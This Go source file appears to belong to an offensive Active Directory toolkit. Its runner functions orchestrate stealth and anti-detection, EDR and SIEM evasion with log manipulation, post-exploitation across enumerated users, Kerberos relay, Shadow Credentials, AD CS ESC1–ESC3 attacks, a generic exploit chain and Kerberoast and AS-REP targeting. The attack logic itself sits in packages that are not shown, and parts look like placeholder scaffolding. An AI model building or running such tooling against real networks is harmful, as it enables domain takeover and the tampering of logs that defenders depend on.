func runStealthMode() error {
	log.Printf("🔥 Implementing stealth mode...")

	// Create stealth configuration
	config := stealth.DefaultStealthConfig()
	config.Enabled = true
	config.RandomDelay = true
	config.AntiDetection = true

	// Create stealth client
	stealthClient, err := stealth.NewStealthClient(config)
	if err != nil {
		return fmt.Errorf("failed to create stealth client: %v", err)
	}

	// Apply stealth techniques
	stealthClient.AntiDetectionTechniques()
	stealthClient.ApplyStealthDelay()

	log.Printf("✅ Stealth mode implemented successfully")
	return nil
}

// runPostExploitation implements post-exploitation automation
func runPostExploitation(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting post-exploitation automation...")

	// Get current user and host
	currentUser := "current_user"
	currentHost := "current_host"
	domain := "corp.local"

	// Create post-exploitation engine
	peEngine := postexploit.NewPostExploitEngine(domain, currentUser, currentHost)

	// Get targets from LDAP
	users, err := client.EnumerateUsers()
	if err != nil {
		return fmt.Errorf("failed to enumerate users: %v", err)
	}

	// Extract target hostnames
	targets := []string{}
	for _, user := range users {
		if user.SamAccountName != currentUser {
			targets = append(targets, user.SamAccountName)
		}
	}

	// Execute post-exploitation chain
	if err := peEngine.ExecutePostExploitChain(targets); err != nil {
		return fmt.Errorf("post-exploitation chain failed: %v", err)
	}

	log.Printf("✅ Post-exploitation automation completed")
	return nil
}

// runDetectionEvasion implements detection evasion
func runDetectionEvasion() error {
	log.Printf("🔥 Starting detection evasion...")

	// Create evasion configuration
	config := evasion.DefaultEvasionConfig()
	config.Enabled = true
	config.EDRBypass = true
	config.SIEMEvasion = true
	config.LogManipulation = true

	// Create evasion engine
	evasionEngine := evasion.NewEvasionEngine(config)

	// Execute evasion chain
	if err := evasionEngine.ExecuteEvasionChain(); err != nil {
		return fmt.Errorf("evasion chain failed: %v", err)
	}

	log.Printf("✅ Detection evasion completed")
	return nil
}

// runKerberosRelay implements Kerberos relay attacks
func runKerberosRelay(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting Kerberos relay attacks...")

	// Create relay engine
	domain := "corp.local"
	targetSPN := "cifs/target.corp.local"
	relayEngine := advanced.NewKerberosRelayEngine(domain, targetSPN)

	// Start relay server
	if err := relayEngine.StartRelayServer(); err != nil {
		return fmt.Errorf("failed to start relay server: %v", err)
	}

	// Let it run for a bit
	time.Sleep(10 * time.Second)

	// Stop relay server
	relayEngine.StopRelayServer()

	log.Printf("✅ Kerberos relay attacks completed")
	return nil
}

// runShadowCredentials implements Shadow Credentials attacks
func runShadowCredentials(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting Shadow Credentials attacks...")

	// Create Shadow Credentials engine
	domain := "corp.local"
	targetUser := "target_user"
	shadowEngine := advanced.NewShadowCredentialsEngine(domain, targetUser)

	// Generate certificate
	if err := shadowEngine.GenerateCertificate(); err != nil {
		return fmt.Errorf("failed to generate certificate: %v", err)
	}

	// Add Shadow Credentials
	if err := shadowEngine.AddShadowCredentials(); err != nil {
		return fmt.Errorf("failed to add Shadow Credentials: %v", err)
	}

	// Authenticate with Shadow Credentials
	if err := shadowEngine.AuthenticateWithShadowCredentials(); err != nil {
		return fmt.Errorf("failed to authenticate with Shadow Credentials: %v", err)
	}

	log.Printf("✅ Shadow Credentials attacks completed")
	return nil
}

// runADCSAttacks implements AD CS attacks
func runADCSAttacks(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting AD CS attacks...")

	// Create AD CS attack engine
	domain := "corp.local"
	ca := "ca.corp.local"
	adcsEngine := advanced.NewADCSAttackEngine(domain, ca)

	// Enumerate certificate templates
	if err := adcsEngine.EnumerateCertificateTemplates(); err != nil {
		return fmt.Errorf("failed to enumerate templates: %v", err)
	}

	// Identify vulnerable templates
	if err := adcsEngine.IdentifyVulnerableTemplates(); err != nil {
		return fmt.Errorf("failed to identify vulnerable templates: %v", err)
	}

	// Execute ESC1 attack
	if err := adcsEngine.ExecuteESC1Attack("VulnerableTemplate"); err != nil {
		log.Printf("⚠️  ESC1 attack failed: %v", err)
	}

	// Execute ESC2 attack
	if err := adcsEngine.ExecuteESC2Attack("VulnerableTemplate"); err != nil {
		log.Printf("⚠️  ESC2 attack failed: %v", err)
	}

	// Execute ESC3 attack
	if err := adcsEngine.ExecuteESC3Attack("VulnerableTemplate"); err != nil {
		log.Printf("⚠️  ESC3 attack failed: %v", err)
	}

	// Generate attack report
	if err := adcsEngine.GenerateAttackReport(); err != nil {
		return fmt.Errorf("failed to generate attack report: %v", err)
	}

	log.Printf("✅ AD CS attacks completed")
	return nil
}

// runExploitChain implements exploit chain
func runExploitChain(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting exploit chain...")

	// Create exploit engine
	domain := "corp.local"
	targetHost := "target.corp.local"
	currentUser := "current_user"
	exploitEngine := exploits.NewExploitEngine(domain, targetHost, currentUser)

	// Initialize exploits
	exploitEngine.InitializeExploits()

	// Get targets from LDAP
	users, err := client.EnumerateUsers()
	if err != nil {
		return fmt.Errorf("failed to enumerate users: %v", err)
	}

	// Extract target hostnames
	targets := []string{}
	for _, user := range users {
		targets = append(targets, user.SamAccountName)
	}

	// Execute exploit chain
	if err := exploitEngine.ExecuteExploitChain(targets); err != nil {
		return fmt.Errorf("exploit chain failed: %v", err)
	}

	// Generate exploit report
	if err := exploitEngine.GenerateExploitReport(); err != nil {
		return fmt.Errorf("failed to generate exploit report: %v", err)
	}

	log.Printf("✅ Exploit chain completed")
	return nil
}

// runAIAnalysis implements AI-powered analysis
func runAIAnalysis(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting AI-powered risk analysis...")

	// Get users from LDAP
	users, err := client.EnumerateUsers()
	if err != nil {
		return fmt.Errorf("failed to enumerate users: %v", err)
	}

	// Convert users to candidates
	asrepCandidates := krb.FindASREPCandidates(users)
	kerberoastCandidates := krb.FindKerberoastCandidates(users)

	// Combine all candidates
	allCandidates := append(asrepCandidates, kerberoastCandidates...)

	// Create AI analyzer
	analyzer := ai.NewAIRiskAnalyzer()

	// Perform risk analysis
	riskScore, err := analyzer.AnalyzeRisk(allCandidates)
	if err != nil {
		return fmt.Errorf("failed to analyze risk: %v", err)
	}

	log.Printf("🤖 AI Risk Analysis Results:")
	log.Printf("   Overall Risk Score: %.2f (%s)", riskScore.OverallScore, riskScore.RiskLevel)
	log.Printf("   Confidence: %.2f", riskScore.Confidence)
	log.Printf("   Risk Factors: %d", len(riskScore.Factors))
	log.Printf("   Recommendations: %d", len(riskScore.Recommendations))

	// Perform anomaly detection
	anomalies, err := analyzer.DetectAnomalies(allCandidates)
	if err != nil {
		return fmt.Errorf("failed to detect anomalies: %v", err)
	}

	log.Printf("🔍 Anomaly Detection Results:")
	log.Printf("   Anomalies Found: %d", len(anomalies.Anomalies))
	log.Printf("   Detection Confidence: %.2f", anomalies.Confidence)

	// Export results
	if err := analyzer.ExportRiskAnalysis(riskScore, "ai_risk_analysis.json"); err != nil {
		return fmt.Errorf("failed to export risk analysis: %v", err)
	}

	if err := analyzer.ExportAnomalyDetection(anomalies, "ai_anomaly_detection.json"); err != nil {
		return fmt.Errorf("failed to export anomaly detection: %v", err)
	}

	log.Printf("✅ AI-powered analysis completed")
	return nil
}

// runPluginSystem implements plugin system
func runPluginSystem(client *krb.LDAPClient) error {
	log.Printf("🔥 Starting plugin system...")

	// Create plugin manager
	pluginManager := plugins.NewPluginManager("plugins", "plugins/config.json")

	// Load plugins
	if err := pluginManager.LoadPlugins(); err != nil {
		return fmt.Errorf("failed to load plugins: %v", err)
	}

	// Get users from LDAP
	users, err := client.EnumerateUsers()
	if err != nil {
		return fmt.Errorf("failed to enumerate users: %v", err)
	}

	// Convert users to candidates
	asrepCandidates := krb.FindASREPCandidates(users)
	kerberoastCandidates := krb.FindKerberoastCandidates(users)

	// Combine all candidates
	allCandidates := append(asrepCandidates, kerberoastCandidates...)

	// Integrate with Kerberos analysis
	if err := pluginManager.IntegrateWithKerberosAnalysis(allCandidates); err != nil {
		return fmt.Errorf("failed to integrate with Kerberos analysis: %v", err)
	}

	// List loaded plugins
	pluginList := pluginManager.ListPlugins()
	log.Printf("🔌 Loaded Plugins: %d", len(pluginList))
	for _, plugin := range pluginList {
		status := "disabled"
		if plugin.Enabled {
			status = "enabled"
		}
		log.Printf("   - %s v%s (%s)", plugin.Name, plugin.Version, status)
	}

	// Save plugin configuration
	if err := pluginManager.SavePluginConfig(); err != nil {
		return fmt.Errorf("failed to save plugin config: %v", err)
	}

	log.Printf("✅ Plugin system completed")
	return nil
}

// runMultiPlatformBuild implements multi-platform build
func runMultiPlatformBuild() error {
	log.Printf("🔥 Starting multi-platform build...")

	// Get platform info
	platformInfo := platform.GetPlatformInfo()
	log.Printf("🔍 Current Platform: %s/%s", platformInfo.OS, platformInfo.Architecture)

	// Create cross-platform builder
	builder := platform.NewCrossPlatformBuilder()

	// Build for all platforms
	if err := builder.BuildAll(); err != nil {
		return fmt.Errorf("failed to build for all platforms: %v", err)
	}

	// Create install scripts
	if err := platform.CreateInstallScripts(); err != nil {
		return fmt.Errorf("failed to create install scripts: %v", err)
	}

	log.Printf("✅ Multi-platform build completed")
	return nil
}
